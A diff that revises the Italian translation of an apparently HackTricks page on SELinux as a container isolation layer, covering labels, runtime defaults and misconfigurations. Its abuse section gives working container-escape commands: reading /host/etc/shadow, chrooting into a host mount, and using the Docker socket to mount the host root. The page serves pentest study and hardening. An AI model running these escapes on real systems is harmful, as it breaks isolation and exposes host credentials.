@@ -4,17 +4,17 @@
 
 ## Panoramica
 
-SELinux è un **sistema di controllo degli accessi obbligatorio basato su etichette**. Ogni processo e oggetto rilevante può avere un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, questo di solito significa che il runtime avvia il processo del container in un dominio container confinato e etichetta il contenuto del container con i tipi corrispondenti. Se la policy funziona correttamente, il processo può leggere e scrivere le risorse che la sua etichetta dovrebbe poter toccare, mentre gli viene negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.
+SELinux è un sistema di Controllo d'Accesso Obbligatorio (Mandatory Access Control) basato su etichette. Ogni processo e oggetto rilevante può portare un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, questo di solito significa che il runtime avvia il processo del container sotto un dominio container confinato ed etichetta il contenuto del container con i tipi corrispondenti. Se la policy funziona correttamente, il processo potrà leggere e scrivere le risorse che la sua etichetta dovrebbe toccare mentre gli sarà negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.
 
-Questa è una delle protezioni lato host più potenti disponibili nelle principali distribuzioni Linux con container. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In quegli ambienti, un revisore che ignora SELinux spesso fraintende perché un percorso che sembra ovvio per compromettere l'host sia in realtà bloccato.
+Questa è una delle protezioni lato host più potenti disponibili nelle implementazioni container Linux mainstream. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi centrati su SELinux. In quegli ambienti, un revisore che ignora SELinux spesso fraintenderà perché una via apparentemente ovvia per compromettere l'host sia in realtà bloccata.
 
 ## AppArmor Vs SELinux
 
-La differenza più semplice da capire a livello alto è che AppArmor è basato sui percorsi mentre SELinux è **basato su etichette**. Questo ha grandi conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi in modo diverso se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount inaspettato. Una policy basata su etichette invece considera quale sia l'etichetta dell'oggetto e cosa il dominio del processo può farci. Questo non rende SELinux semplice, ma lo rende robusto contro una classe di assunzioni legate ai trucchi sui percorsi che i difensori a volte fanno accidentalmente nei sistemi basati su AppArmor.
+La differenza a alto livello più semplice è che AppArmor è basato sui percorsi mentre SELinux è **basato su etichette**. Questo ha grandi conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi diversamente se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount inatteso. Una policy basata su etichette invece si chiede quale sia l'etichetta dell'oggetto e cosa il dominio del processo può fare su di essa. Questo non rende SELinux semplice, ma lo rende robusto rispetto a una classe di assunzioni basate su trucchi sui percorsi che i difensori a volte compiono accidentalmente nei sistemi basati su AppArmor.
 
-Poiché il modello è orientato alle etichette, la gestione dei volumi del container e le decisioni di relabeling sono critiche per la sicurezza. Se il runtime o l'operatore modificano le etichette in modo troppo esteso per "far funzionare i mount", il confine della policy che doveva contenere il workload può diventare molto più debole del previsto.
+Poiché il modello è orientato alle etichette, la gestione dei volumi dei container e le decisioni di rilabeling sono critiche per la sicurezza. Se il runtime o l'operatore modificano le etichette in modo troppo ampio per "far funzionare i mount", il confine della policy che doveva contenere il workload può diventare molto più debole del previsto.
 
-## Laboratorio
+## Lab
 
 Per verificare se SELinux è attivo sull'host:
 ```bash
@@ -32,40 +32,40 @@ Per confrontare un'esecuzione normale con una in cui l'etichettatura è disabili
 podman run --rm fedora cat /proc/self/attr/current
 podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
 ```
-Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload che esegue sotto il dominio container previsto e uno a cui è stato tolto quello strato di applicazione.
+Su un host abilitato a SELinux, questa è una dimostrazione molto pratica perché mostra la differenza tra un carico di lavoro che gira nel dominio del container previsto e uno che è stato privato di quel livello di enforcement.
 
 ## Uso a runtime
 
-Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux fa parte delle impostazioni di default della piattaforma. Rootless Podman insieme a SELinux rappresenta una delle baseline container mainstream più robuste perché il processo è già privo di privilegi sul lato host ed è comunque confinato da MAC policy. Docker può usare SELinux dove è supportato, anche se gli amministratori a volte lo disabilitano per aggirare la frizione dell'etichettatura dei volumi. CRI-O e OpenShift fanno ampio uso di SELinux come parte della loro strategia di isolamento dei container. Kubernetes può esporre impostazioni correlate a SELinux, ma il loro valore ovviamente dipende dal fatto che il sistema operativo del nodo supporti ed applichi effettivamente SELinux.
+Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux è parte delle impostazioni di default della piattaforma. Rootless Podman insieme a SELinux costituisce una delle baseline per container più robuste, perché il processo è già non privilegiato sul lato host e rimane confinato dalla MAC policy. Docker può usare SELinux dove è supportato, anche se gli amministratori a volte lo disabilitano per aggirare problemi di labeling dei volumi. CRI-O e OpenShift fanno ampio uso di SELinux come parte della loro strategia di isolamento dei container. Kubernetes può esporre impostazioni correlate a SELinux, ma il loro valore dipende ovviamente dal fatto che il sistema operativo del nodo supporti e applichi effettivamente SELinux.
 
-La lezione ricorrente è che SELinux non è un contorno opzionale. Negli ecosistemi costruiti intorno a esso, fa parte del confine di sicurezza atteso.
+La lezione ricorrente è che SELinux non è un condimento opzionale. Negli ecosistemi costruiti intorno a esso, fa parte del perimetro di sicurezza previsto.
 
-## Misconfigurazioni
+## Configurazioni errate
 
-L'errore classico è `label=disable`. Operativamente, questo accade spesso perché un mount di volume è stato negato e la soluzione temporanea più rapida è stata togliere SELinux dall'equazione invece di correggere il modello di etichettatura. Un altro errore comune è la riletichettatura errata del contenuto dell'host. Operazioni di riletichettatura ampie possono far funzionare l'applicazione, ma possono anche ampliare ciò che il container è autorizzato a toccare ben oltre quanto originariamente inteso.
+Il classico errore è `label=disable`. Operativamente, questo capita spesso perché un mount di un volume viene negato e la soluzione rapida a breve termine è stata rimuovere SELinux dall'equazione invece di correggere il modello di labeling. Un altro errore comune è il relabeling errato del contenuto host. Operazioni di relabeling ampie possono far funzionare l'applicazione, ma possono anche estendere ciò che il container è autorizzato a toccare ben oltre quanto originariamente previsto.
 
-È anche importante non confondere **SELinux installato** con **SELinux effettivo**. Un host può supportare SELinux e trovarsi comunque in modalità permissiva, oppure il runtime potrebbe non lanciare il workload sotto il dominio previsto. In quei casi la protezione è molto più debole di quanto la documentazione potrebbe suggerire.
+È inoltre importante non confondere SELinux **installato** con SELinux **effettivo**. Un host può supportare SELinux ma essere comunque in modalità permissiva, oppure il runtime potrebbe non avviare il workload nel dominio previsto. In questi casi la protezione è molto più debole di quanto la documentazione possa suggerire.
 
 ## Abuso
 
-Quando SELinux è assente, in modalità permissiva o ampiamente disabilitato per il workload, i percorsi montati dall'host diventano molto più facili da abusare. Lo stesso bind mount che altrimenti sarebbe stato vincolato dalle etichette può diventare una via diretta ai dati dell'host o alla modifica dell'host. Questo è particolarmente rilevante quando si combina con mount di volumi scrivibili, directory del runtime del container o scorciatoie operative che espongono percorsi sensibili dell'host per comodità.
+Quando SELinux è assente, in modalità permissiva, o ampiamente disabilitato per il workload, i percorsi montati dell'host diventano molto più facili da sfruttare. Lo stesso bind mount che altrimenti sarebbe stato vincolato dalle label può diventare una via diretta ai dati dell'host o a modifiche dell'host. Ciò è particolarmente rilevante se combinato con mount di volumi scrivibili, directory del runtime del container, o scorciatoie operative che espongono percorsi sensibili dell'host per comodità.
 
-SELinux spesso spiega perché una writeup di breakout generico funziona immediatamente su un host ma fallisce ripetutamente su un altro anche se i flag del runtime sembrano simili. L'ingrediente mancante non è di frequente un namespace o una capability, bensì un confine di etichette che è rimasto intatto.
+SELinux spiega spesso perché una writeup di breakout generico funzioni immediatamente su un host ma fallisca ripetutamente su un altro, anche se i flag del runtime sembrano simili. L'ingrediente mancante non è di frequente un namespace o una capability, ma un confine di label che è rimasto intatto.
 
-Il controllo pratico più veloce è confrontare il contesto attivo e poi sondare i percorsi montati dell'host o le directory di runtime che normalmente sarebbero confinate dalle etichette:
+Il controllo pratico più veloce è confrontare il contesto attivo e poi sondare i percorsi montati dell'host o le directory del runtime che normalmente sarebbero confinate dalle label:
 ```bash
 getenforce 2>/dev/null
 cat /proc/self/attr/current
 find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
 find /host -maxdepth 2 -ls 2>/dev/null | head
 ```
-Se è presente un bind mount dell'host e l'etichettatura di SELinux è stata disabilitata o indebolita, spesso si verifica prima un'esposizione di informazioni:
+Se è presente un host bind mount e il labeling di SELinux è stato disabilitato o indebolito, spesso la divulgazione di informazioni avviene per prima:
 ```bash
 ls -la /host/etc 2>/dev/null | head
 cat /host/etc/passwd 2>/dev/null | head
 cat /host/etc/shadow 2>/dev/null | head
 ```
-Se il mount è scrivibile e il container è effettivamente host-root dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host invece di indovinare:
+Se il mount è writable e il container è effettivamente host-root dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host piuttosto che indovinare:
 ```bash
 touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
 ls -l /host/tmp/selinux_test 2>/dev/null
@@ -75,57 +75,58 @@ Su host con SELinux abilitato, la perdita delle etichette nelle directory di sta
 find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
 find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
 ```
-Questi comandi non sostituiscono una full escape chain, ma chiariscono molto rapidamente se SELinux era ciò che impediva l'accesso ai dati dell'host o la modifica dei file sul lato host.
+Questi comandi non sostituiscono una full escape chain, ma chiariscono molto rapidamente se SELinux stava impedendo l'accesso ai dati dell'host o la modifica dei file sul host.
 
-### Esempio completo: SELinux disabilitato + Writable Host Mount
+### Esempio completo: SELinux disabilitato + mount host scrivibile
 
-Se la labeling di SELinux è disabilitata e il filesystem dell'host è montato in scrittura su `/host`, una full host escape diventa un normale caso di abuso di bind-mount:
+Se SELinux labeling è disabilitato e il filesystem dell'host è montato in scrittura su `/host`, una full host escape diventa un normale caso di bind-mount abuse:
 ```bash
 getenforce 2>/dev/null
 cat /proc/self/attr/current
 touch /host/tmp/selinux_escape_test
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Se il `chroot` ha successo, il processo del container ora opera sul filesystem dell'host:
+Se il `chroot` riesce, il container process sta ora operando dal host filesystem:
 ```bash
 id
 hostname
 cat /etc/passwd | tail
 ```
-### Esempio completo: SELinux Disabled + Runtime Directory
+### Esempio completo: SELinux disabilitato + Runtime Directory
 
-Se il workload può raggiungere un runtime socket una volta che le labels sono disabilitate, l'escape può essere delegato al runtime:
+Se il workload può raggiungere una socket del runtime una volta che le etichette sono disabilitate, l'escape può essere delegato al runtime:
 ```bash
 find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 ```
-L'osservazione rilevante è che SELinux spesso costituiva il controllo che impediva esattamente questo tipo di accesso host-path o runtime-state.
+L'osservazione rilevante è che SELinux spesso era il controllo che impediva proprio questo tipo di accesso a host-path o runtime-state.
 
-## Checks
+## Controlli
 
-L'obiettivo dei controlli SELinux è confermare che SELinux sia abilitato, identificare l'attuale contesto di sicurezza e verificare se i file o i percorsi di interesse siano effettivamente confinati tramite etichette.
+L'obiettivo dei controlli SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi di tuo interesse siano effettivamente label-confined.
 ```bash
 getenforce                              # Enforcing / Permissive / Disabled
 ps -eZ | grep -i container              # Process labels for container-related processes
 ls -Z /path/of/interest                 # File or directory labels on sensitive paths
 cat /proc/self/attr/current             # Current process security context
 ```
-What is interesting here:
+Quello che è interessante qui:
 
-- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
-- Se il contesto del processo corrente appare inaspettato o troppo ampio, il workload potrebbe non essere eseguito sotto la policy di container prevista.
-- Se i file montati dall'host o le directory di runtime hanno label che il processo può accedere troppo liberamente, i bind mounts diventano molto più pericolosi.
+- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambia il significato dell'intera sezione SELinux.
+- Se il contesto del processo corrente sembra inaspettato o troppo ampio, il carico di lavoro potrebbe non essere eseguito sotto la policy container prevista.
+- Se i file montati dall'host o le directory runtime hanno etichette a cui il processo può accedere troppo liberamente, i bind mounts diventano molto più pericolosi.
 
-Quando si esamina un container su una piattaforma con SELinux abilitato, non considerare l'etichettatura come un dettaglio secondario. In molti casi è una delle ragioni principali per cui l'host non è già compromesso.
+Quando si revisiona un container su una piattaforma con SELinux abilitato, non considerare l'etichettatura un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già compromesso.
 
-## Impostazioni predefinite del runtime
+## Runtime Defaults
 
-| Runtime / platform | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
+| Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | Dipende dall'host | La separazione SELinux è disponibile sugli host abilitati a SELinux, ma il comportamento preciso dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, ampia rilabelizzazione dei bind mounts, `--privileged` |
-| Podman | Comunemente abilitato sugli host con SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux a meno che non sia disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
-| Kubernetes | Non assegnato automaticamente a livello di Pod in generale | Esiste supporto SELinux, ma i Pod di solito necessitano di `securityContext.seLinuxOptions` o di default specifici della piattaforma; sono richiesti il runtime e il supporto del nodo | opzioni `seLinuxOptions` deboli o troppo ampie, esecuzione su nodi permissive/disabled, politiche di piattaforma che disabilitano l'etichettatura |
-| CRI-O / OpenShift style deployments | Spesso considerato fondamentale | SELinux è spesso una parte centrale del modello di isolamento dei nodi in questi ambienti | policy personalizzate che ampliano eccessivamente gli accessi, disabilitazione dell'etichettatura per compatibilità |
+| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile sugli host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, rilabeling esteso dei bind mounts, `--privileged` |
+| Podman | Comunemente abilitato sugli host SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux, a meno che non sia disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
+| Kubernetes | Non generalmente assegnato automaticamente a livello di Pod | Il supporto SELinux esiste, ma i Pod di solito necessitano di `securityContext.seLinuxOptions` o di impostazioni predefinite specifiche della piattaforma; sono richiesti supporto runtime e del nodo | valori `seLinuxOptions` deboli o troppo generici, esecuzione su nodi permissive/disabled, policy di piattaforma che disabilitano l'etichettatura |
+| CRI-O / OpenShift style deployments | Spesso fortemente utilizzato | SELinux è spesso una parte centrale del modello di isolamento del nodo in questi ambienti | policy personalizzate che ampliano eccessivamente gli accessi, disabilitazione dell'etichettatura per compatibilità |
 
 I default di SELinux dipendono più dalla distribuzione rispetto ai default di seccomp. Su sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Su sistemi non-SELinux, è semplicemente assente.
+{{#include ../../../../banners/hacktricks-training.md}}
